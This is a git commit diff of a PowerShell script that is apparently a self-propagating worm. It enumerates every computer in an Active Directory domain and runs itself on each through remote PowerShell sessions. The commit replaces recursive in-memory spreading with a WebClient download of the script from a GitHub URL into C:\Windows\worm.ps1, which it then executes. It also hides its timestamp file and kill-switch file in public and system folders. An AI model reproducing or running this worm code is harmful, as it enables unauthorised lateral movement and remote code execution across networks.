fb75399b11de51a49b2beb4c919331d468e75651
Anthony Magrene <ekfhalomaster@gmail.com>
2021-01-31 19:25:26 -0500

    Continued Development
    -Script pulled via web request.

--- EnumerateDomain.ps1
+++ EnumerateDomain.ps1
@@ -1,4 +1,5 @@
-﻿function wormy{
+﻿$code = Get-Content -Path C:\Windows\EnumerateDomain.ps1 | out-null
+function wormy{
 
 while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
 start-job -Scriptblock{[int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'}
@@ -11,37 +12,11 @@ Foreach($i in $computerNames){
         #get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 5 
         if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
             if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 5){
-            Invoke-Command -ScriptBlock {
-
-
-                function wormy{
-                start-job -Scriptblock{[int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'}
-                while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
-                Write-Output 'slither'
-                $computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
-                Foreach($i in $computerNames){
-                    $s = new-pssession -ComputerName $i
-                    invoke-command -ComputerName $i -ScriptBlock {hostname}
-                    invoke-command -ComputerName $i -ScriptBlock {
-        
-                        if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 5 ){
-                            Invoke-Command -ScriptBlock {
-                            wormy
-                            }
-                            }
-                        }
-                    }
-                    Exit-PSSession
-                    start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
+                Invoke-Command -ScriptBlock {
+                $WebClient = New-Object System.Net.WebClient
+                $WebClient.DownloadFile("https://github.com/Magrene/PowershellShell/blob/master/EnumerateDomain.ps1","C:\Windows\worm.ps1")
+                C:\Windows\worm.ps1
                 }
-                }
-
-
-                wormy
-
-
-
-                    }
             }
             }
             else{}
